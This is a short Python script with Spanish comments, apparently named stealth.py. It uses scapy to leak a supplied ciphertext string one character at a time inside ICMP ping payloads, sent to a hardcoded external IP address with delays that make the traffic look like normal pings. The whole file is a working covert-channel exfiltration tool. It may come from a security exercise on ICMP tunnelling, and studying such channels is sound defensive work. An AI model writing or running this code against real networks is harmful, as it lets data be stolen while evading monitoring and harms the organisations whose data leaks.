from scapy.all import IP, ICMP, send, sr1, Raw  # Asegúrate de importar Raw
import sys
import time

def send_ping_with_hidden_data(destination, data):
    print(f"Enviando datos ocultos a {destination}:")
    
    sequence = 0  # Inicia la secuencia en 0
    for char in data:
        # Crear un paquete ICMP Echo Request con el carácter en el campo de datos y secuencia adecuada
        packet = IP(dst=destination)/ICMP(type=8, seq=sequence, id=0)/Raw(load=char)
        
        # Enviar el paquete sin esperar respuesta para simular tráfico ICMP Request
        send(packet, verbose=False)
        
        print(f"Carácter '{char}' enviado exitosamente. Secuencia: {sequence}")
        
        # Incrementamos la secuencia
        sequence += 1
        
        # Esperar un poco para no saturar la red
        time.sleep(0.5)

if len(sys.argv) != 2:
    print("Uso: python3 stealth.py <texto_cifrado>")
    sys.exit(1)

texto_cifrado = sys.argv[1]
destination = "162.159.137.232"  # Ejemplo de IP de destino

send_ping_with_hidden_data(destination, texto_cifrado)
print("Datos ocultos enviados exitosamente.")
